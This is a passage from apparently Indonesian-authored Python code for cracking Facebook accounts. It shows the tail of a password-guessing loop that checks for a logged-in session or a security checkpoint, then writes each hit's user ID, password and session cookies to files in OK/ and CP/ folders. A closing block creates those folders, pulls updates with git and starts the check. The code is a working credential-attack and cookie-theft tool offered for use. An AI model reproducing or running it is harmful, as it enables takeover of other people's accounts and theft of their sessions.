				kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
				user = re.findall('c_user=(.*);xs', kukis)[0]
				tree = Tree(f'[white]┌─[ [bold green]SUCCESSFUL[white] ]',style='blue')
				tree.add(f'[b green]{user}[/]|[b green]{pw}[/]').add(f'[b green]{kukis}[/]')
				cetak(tree)
				open('OK/'+okc,'a').write(user+'|'+pw+'|'+kukis+'\n')
				break
			elif "checkpoint" in ses.cookies.get_dict():
				cp+=1
				user = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
				tree = Tree(f'[white]┌─[ [bold yellow]CHECKPOINT[white] ]',style='blue')
				tree.add(f'[b yellow]{user}[/]|[b yellow]{pw}[/]').add(f'[b purple]{ua}[/]')
				cetak(tree)
				open('CP/'+cpc,'a').write(user+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#### [ CLOSING ] ####
if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	os.system('git pull')
	cek()
